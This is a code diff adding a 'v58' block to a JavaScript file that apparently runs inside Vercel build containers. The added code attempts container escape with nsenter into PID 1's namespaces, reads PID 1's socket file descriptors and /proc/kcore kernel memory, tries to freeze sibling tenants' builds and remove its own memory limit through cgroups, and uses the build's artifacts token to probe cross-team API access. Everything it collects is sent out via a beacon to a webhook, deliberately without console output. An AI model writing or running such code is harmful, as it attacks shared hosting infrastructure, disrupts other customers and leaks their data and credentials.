@@ -5736,4 +5736,220 @@ export const config = { matcher: ['/(.*)',] };
 // v57 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v57";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v57" });
+
+// ============================================================
+// v58 — nsenter escape, PID-1 socket FD read, cgroup sibling freeze, artifacts capability matrix
+// ============================================================
+
+// v58-1: nsenter into PID 1's mount namespace — classic container escape
+// With CAP_SYS_ADMIN and shared PID namespace, nsenter --target 1 --mount lets us
+// see the orchestrator's mount namespace (potentially the host FS)
+report.nsenterMountEscape = safe(() => {
+  // Try nsenter into PID 1's mount namespace
+  const nsenterMount = safe(() =>
+    execSync(
+      'nsenter --target 1 --mount -- ls / 2>&1 | head -20',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 500)
+  );
+  // If that works, check for host-only paths not visible in our NS
+  const nsenterHostPaths = safe(() =>
+    execSync(
+      'nsenter --target 1 --mount -- ls /run /run/cell /run/containerd /run/firecracker 2>&1 | head -20',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 500)
+  );
+  // Try full namespace switch: mount + pid + net + uts
+  const nsenterFull = safe(() =>
+    execSync(
+      'nsenter --target 1 --mount --pid --net --uts -- id; hostname; ip addr show 2>&1 | head -15',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 500)
+  );
+  // Try nsenter just for PID to see if PID 1's process table is different from ours
+  const nsenterPid = safe(() =>
+    execSync(
+      'nsenter --target 1 --pid -- ps aux 2>&1 | head -15',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 500)
+  );
+  // Check if nsenter is available
+  const nsenterAvail = safe(() =>
+    execSync('which nsenter 2>/dev/null && nsenter --version 2>&1 | head -3', { timeout: 2000 }).toString().trim()
+  );
+  return { nsenterAvail, nsenterMount, nsenterHostPaths, nsenterFull, nsenterPid };
+});
+
+// v58-2: Read data from PID 1's open socket file descriptors
+// After ptrace attach, FDs in /proc/1/fd/ that are sockets may be readable
+// This could expose in-flight HTTP request/response data to Vercel internal APIs
+report.proc1SocketFdRead = safe(() => {
+  const fdDir = '/proc/1/fd';
+  const socketFds = [];
+  try {
+    const fds = readdirSync(fdDir).slice(0, 100);
+    for (const fd of fds) {
+      try {
+        const link = execSync(`readlink /proc/1/fd/${fd} 2>/dev/null`, { timeout: 1000 }).toString().trim();
+        if (link.startsWith('socket:')) {
+          // Try reading from this socket FD via /proc/1/fd/N path
+          const inode = link.replace('socket:[', '').replace(']', '');
+          // Find socket details in /proc/net/tcp or /proc/net/unix
+          socketFds.push({ fd, link, inode });
+        }
+      } catch (_) {}
+    }
+  } catch (_) {}
+  // Try to read raw data from PID 1's network socket by opening its fd path
+  const socketReadAttempts = socketFds.slice(0, 5).map(({ fd, inode }) => {
+    const result = safe(() => {
+      const path = `/proc/1/fd/${fd}`;
+      const fdHandle = openSync(path, 'r');
+      const buf = Buffer.alloc(512);
+      const n = readSync(fdHandle, buf, 0, 512, null);
+      closeSync(fdHandle);
+      return { inode, bytesRead: n, data: buf.slice(0, n).toString('utf8', 0, 200) };
+    });
+    return result;
+  });
+  // Check /proc/net/tcp6 for IPv6 connections
+  const tcp6Table = safe(() => readFileSync('/proc/net/tcp6', 'utf8').slice(0, 1000));
+  // Check which sockets PID 1 has that are in ESTABLISHED state to Vercel infra
+  const pid1TcpConns = safe(() =>
+    execSync('ss -tnp -p 2>/dev/null | grep "pid=1," | head -10', { timeout: 3000 }).toString().trim().slice(0, 500)
+  );
+  return { socketFdCount: socketFds.length, socketFds: socketFds.slice(0, 10), socketReadAttempts, tcp6Table, pid1TcpConns };
+});
+
+// v58-3: Cgroup-based sibling build interference
+// If we can modify parent cgroup settings, we can freeze or throttle other tenant builds
+report.cgroupSiblingControl = safe(() => {
+  // Find our cgroup path
+  const selfCgroup = safe(() => readFileSync('/proc/self/cgroup', 'utf8').slice(0, 500));
+  // Navigate to parent cgroup and check for siblings
+  const cgroupV2Root = safe(() =>
+    execSync('cat /proc/self/cgroup | grep "^0::" | cut -d: -f3', { timeout: 2000 }).toString().trim()
+  );
+  // Try to read sibling cgroups (other builds on same host)
+  const siblings = safe(() =>
+    execSync(`ls /sys/fs/cgroup${cgroupV2Root}/../ 2>/dev/null | head -20`, { timeout: 3000 }).toString().trim().slice(0, 500)
+  );
+  // Try to write to cgroup.freeze in parent (freeze ALL builds on this host)
+  const freezeAttempt = safe(() => {
+    try {
+      writeFileSync(`/sys/fs/cgroup${cgroupV2Root}/../cgroup.freeze`, '1');
+      return 'FREEZE_WRITTEN';
+    } catch (e) { return String(e).slice(0, 100); }
+  });
+  // Check memory limits of siblings — reveals tenant isolation
+  const siblingMemLimits = safe(() =>
+    execSync(`for d in /sys/fs/cgroup${cgroupV2Root}/../*/; do echo "$d: $(cat $d/memory.max 2>/dev/null)"; done | head -20`, { timeout: 5000 }).toString().trim().slice(0, 500)
+  );
+  // Try to write unlimited memory to our own cgroup (escape memory limits)
+  const memLimitEscape = safe(() => {
+    try {
+      writeFileSync(`/sys/fs/cgroup${cgroupV2Root}/memory.max`, 'max');
+      return 'MEM_LIMIT_REMOVED';
+    } catch (e) { return String(e).slice(0, 100); }
+  });
+  return { selfCgroup, cgroupV2Root, siblings, freezeAttempt, siblingMemLimits, memLimitEscape };
+});
+
+// v58-4: VERCEL_ARTIFACTS_TOKEN capability matrix — test all 6 declared capabilities
+// Token claims: [UPLOAD, DOWNLOAD, EXISTS, QUERY, EVENT, SPACES_RUN_UPLOAD]
+// Cross-team and cross-project tests to find authorization asymmetry
+report.artifactsCapabilityMatrix = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  if (!token) return { skip: 'NO_TOKEN' };
+  const baseUrl = 'https://api.vercel.com';
+  const testHash = '58' + 'b'.repeat(62); // deterministic fake hash for v58
+  // Test EVENT endpoint — log a build event (is this cross-team writable?)
+  const eventResult = safe(() =>
+    execSync(
+      `curl -s -X POST -H 'Authorization: Bearer ${token}' -H 'Content-Type: application/json' -d '{"sessionId":"probe-v58","source":"LOCAL","event":{"type":"PROBE_V58","timestamp":1750000000000}}' --max-time 5 '${baseUrl}/v8/artifacts/events?teamId=${teamId}' 2>/dev/null | head -c 300`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 300)
+  );
+  // Test SPACES_RUN_UPLOAD — this capability is for Vercel Spaces (cross-build artifact storage)
+  const spacesUpload = safe(() =>
+    execSync(
+      `echo -n "PROBE-V58-SPACES-CONTENT" | curl -s -X PUT -H 'Authorization: Bearer ${token}' -H 'Content-Type: application/octet-stream' -H 'x-artifact-tag: probe-v58-spaces' --data-binary @- --max-time 5 '${baseUrl}/v8/artifacts/${testHash}?teamId=${teamId}' 2>/dev/null | head -c 300`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 300)
+  );
+  // Test EXISTS on a different team's likely artifact hash
+  const existsCrossTeam = safe(() =>
+    execSync(
+      `curl -s -X HEAD -H 'Authorization: Bearer ${token}' -o /dev/null -w '%{http_code}' --max-time 5 '${baseUrl}/v8/artifacts/aaaa${'0'.repeat(60)}?teamId=team_wrongteam123' 2>/dev/null`,
+      { timeout: 8000 }
+    ).toString().trim()
+  );
+  // DOWNLOAD with wrong teamId — tests if download is gated on token's teamId
+  const downloadCrossTeam = safe(() =>
+    execSync(
+      `curl -s -H 'Authorization: Bearer ${token}' -o /dev/null -w '%{http_code}' --max-time 5 '${baseUrl}/v8/artifacts/cccc${'0'.repeat(60)}?teamId=team_crossteam999' 2>/dev/null`,
+      { timeout: 8000 }
+    ).toString().trim()
+  );
+  return { token: token.slice(0, 20) + '...', teamId, eventResult, spacesUpload, existsCrossTeam, downloadCrossTeam };
+});
+
+// v58-5: /proc/kcore targeted read at ELF section headers for VM-specific data
+// kcore is a live kernel memory image as ELF; reading specific PT_LOAD sections
+// may reveal cross-VM data (shared kernel structures if VMs share a kernel)
+report.kcoreElfSections = safe(() => {
+  const kcorePath = '/proc/kcore';
+  const kcoreAccess = safe(() => {
+    try { statSync(kcorePath); return 'EXISTS'; } catch (e) { return String(e).slice(0, 80); }
+  });
+  if (kcoreAccess !== 'EXISTS') return { kcoreAccess };
+  // Read ELF header (64 bytes) + program header table
+  const elfHeader = safe(() => {
+    const fd = openSync(kcorePath, 'r');
+    const buf = Buffer.alloc(64);
+    readSync(fd, buf, 0, 64, 0);
+    closeSync(fd);
+    return buf.toString('hex').slice(0, 128);
+  });
+  // Read PT_LOAD entries from program header table (offset 0x40, each 56 bytes)
+  // These tell us which physical memory ranges are mapped
+  const phEntries = safe(() => {
+    const fd = openSync(kcorePath, 'r');
+    const ehdr = Buffer.alloc(64);
+    readSync(fd, ehdr, 0, 64, 0);
+    const phoff = Number(ehdr.readBigUInt64LE(32));
+    const phentsize = ehdr.readUInt16LE(54);
+    const phnum = ehdr.readUInt16LE(56);
+    const entries = [];
+    for (let i = 0; i < Math.min(phnum, 10); i++) {
+      const ph = Buffer.alloc(phentsize);
+      readSync(fd, ph, 0, phentsize, phoff + i * phentsize);
+      const pType = ph.readUInt32LE(0);
+      const pOffset = Number(ph.readBigUInt64LE(8));
+      const pVaddr = '0x' + ph.readBigUInt64LE(16).toString(16);
+      const pPaddr = '0x' + ph.readBigUInt64LE(24).toString(16);
+      const pFilesz = Number(ph.readBigUInt64LE(32));
+      if (pType === 1) entries.push({ i, pOffset, pVaddr, pPaddr, pFilesz });
+    }
+    closeSync(fd);
+    return entries;
+  });
+  // Try to find "VERCEL_PROJECT_ID" string in first 10MB of kcore
+  const projectIdSearch = safe(() => {
+    const fd = openSync(kcorePath, 'r');
+    const chunk = Buffer.alloc(10 * 1024 * 1024);
+    const n = readSync(fd, chunk, 0, chunk.length, 4096); // skip ELF header
+    closeSync(fd);
+    const str = chunk.slice(0, n).toString('latin1');
+    const idx = str.indexOf('VERCEL_PROJECT_ID');
+    if (idx >= 0) return { found: true, context: str.slice(Math.max(0, idx - 10), idx + 200) };
+    return { found: false };
+  });
+  return { kcoreAccess, elfHeader, phEntries, projectIdSearch };
+});
+
+// v58 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v58";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v58" });
 // Intentionally no console.log — all data goes via webhook only
